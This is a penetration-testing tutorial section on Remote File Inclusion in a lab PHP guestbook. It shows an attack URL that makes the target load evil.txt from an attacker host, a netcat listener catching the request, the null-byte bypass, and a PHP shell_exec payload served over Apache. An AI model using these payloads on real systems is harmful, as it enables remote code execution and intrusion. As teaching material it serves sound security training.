    # 13.3.2 - Remote File Inclusion


    Remote file inclusion (RFI) vulnerabilities are less common than LFIs and are
    commonly easier to exploit. In fact, the LFI demonstrated above is also a RFI
    vulnerability. Consider the following parameter given as the LANG value:


    ```

    http://192.168.11.35/addguestbook.php?name=acomment&b=LANG=http://192.168.10.5/evil.txt

    ```


    This request would force the PHP webserver to include a remote file, located on
    our server, called evil.txt. Checking the incoming request by the PHP engine,
    we can see that the file evil.txt.php was requested. We can once again use the
    null byte trick to bypass this issue.


    ```

    root@kali:~# nc -nlvp 80

    listening on [any] ...

    connect to [192.168.10.5] from (UNKNOWN) [192.168.11.35] 49576

    GET /evil.txt.php HTTP/1.0

    Host: 192.168.10.5

    ```


    We can now start our Apache server and host a malicious evil.txt file as shown
    below:


    ```

    root@kali:/var/www# cat evil.txt

    <?php echo shell_exec("ipconfig");?>

    root@kali:/var/www# apachectl start

    ```


    Once the file is in place and our webserver running, we can send our remote inclusion
    attack URL to the vulnerable web application and see our code executed successfully.'
